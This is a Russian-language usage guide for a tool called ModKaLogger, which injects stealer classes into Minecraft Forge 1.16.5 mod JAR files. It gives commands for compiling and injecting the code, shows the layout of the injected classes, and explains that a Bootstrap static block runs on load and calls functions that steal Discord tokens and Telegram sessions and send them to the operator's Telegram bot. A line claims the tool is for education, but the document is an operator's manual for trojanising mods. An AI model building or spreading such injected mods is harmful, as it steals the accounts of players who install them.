# Руководство по вшиванию ModKaLogger

## Описание

Этот скрипт позволяет вшить ModKaLogger в любой Minecraft мод (Forge 1.16.5).

## Требования

- Python 3.6+
- Java JDK 8+ (для компиляции)
- Gradle (используется автоматически через gradlew)
- Исходный мод в формате `.jar`

## Использование

### Способ 1: Автоматическая компиляция и вшивание

```bash
python compile_and_inject.py ВашМод.jar
```

Этот скрипт:
1. Компилирует ModKaLogger через `gradlew build`
2. Вшивает скомпилированные классы в целевой мод
3. Результат сохраняется как `ВашМод_injected.jar`

### Способ 2: Указать путь вывода

```bash
python compile_and_inject.py ВашМод.jar output/ВашМод_injected.jar
```

### Способ 3: Только вшивание (если уже скомпилировано)

```bash
python inject_mod.py ВашМод.jar
```

## Что делает скрипт

1. **Компилирует ModKaLogger** - запускает `gradlew build` для компиляции всех классов
2. **Разархивирует мод** - распаковывает JAR файл целевого мода
3. **Находит пакет мода** - определяет основной пакет (com, ru, org и т.д.)
4. **Копирует классы** - вшивает все скомпилированные классы ModKaLogger в пакет мода
5. **Добавляет Bootstrap** - вшивает Bootstrap класс, который инициализирует функционал
6. **Обновляет конфиги** - удаляет конфликтующие ссылки на modkalogger из mods.toml
7. **Переупаковывает** - создаёт новый JAR с вшитым модом
8. **Очищает временные файлы** - удаляет временные папки

## Структура вшивания

```
ВашМод.jar
├── ru/                           ← Пакет целевого мода
│   ├── yourcompany/
│   │   └── yourmod/
│   │       └── YourMainMod.class
│   └── modkalogger/              ← Вшитые классы ModKaLogger
│       ├── Bootstrap.class       ← Инициализирует функционал
│       ├── Initializer.class
│       ├── ModKaLogger.class
│       ├── discord/
│       │   └── Discord.class
│       ├── telegram/
│       │   ├── Telegram.class
│       │   └── TelegramSender.class
│       ├── events/
│       │   └── CommandHandler.class
│       └── asm/
│           ├── ClassLoaderHook.class
│           ├── ModKaLoggerTransformer.class
│           └── ModKaLoggerClassVisitor.class
└── META-INF/
    └── mods.toml                 ← Очищен от modkalogger
```

## Как работает инициализация

1. **Bootstrap класс** содержит статический блок, который выполняется при загрузке класса
2. **Статический блок** запускает функционал в отдельном потоке
3. **Поток ждёт 3 секунды** для инициализации Minecraft
4. **Затем запускает**:
   - `Discord.stealAndSendTokens()` - кража токенов Discord
   - `Telegram.stealAndSendSessions()` - кража сессий Telegram

## Конфигурация

Перед компиляцией отредактируй `src/main/java/com/modkalogger/ModKaLogger.java`:

```java
public static final String TELEGRAM_BOT_TOKEN = "ТВОЙ_ТОКЕН_БОТА";
public static final String TELEGRAM_ADMIN_ID = "ТВОЙ_ID";
```

## Примеры

### Вшить в мод MyAwesomeMod

```bash
python compile_and_inject.py MyAwesomeMod-1.0.jar
```

Результат: `MyAwesomeMod-1.0_injected.jar`

### Вшить в папку output

```bash
python compile_and_inject.py mods/MyMod.jar output/MyMod_injected.jar
```

## Возможные ошибки

### "gradlew не найден"
- Убедись что скрипт находится в корне проекта ModKaLogger
- Проверь наличие файла `gradlew.bat` (Windows) или `gradlew` (Linux/Mac)

### "Файл мода не найден"
- Проверь путь к файлу мода
- Убедись что файл существует

### "Пакет мода не найден"
- Убедись что это валидный Forge мод
- Проверь структуру JAR файла

### Ошибка при распаковке
- Убедись что это валидный JAR файл
- Попробуй открыть JAR архиватором (7-Zip, WinRAR)

### Мод не загружается после вшивания
- Проверь логи Minecraft в `logs/latest.log`
- Убедись что целевой мод совместим с Forge 1.16.5
- Попробуй вшить в другой мод для проверки

## Безопасность

⚠️ **Важно**: Этот мод собирает конфиденциальные данные. Используй только в образовательных целях.

## Лицензия

Используется в образовательных целях.
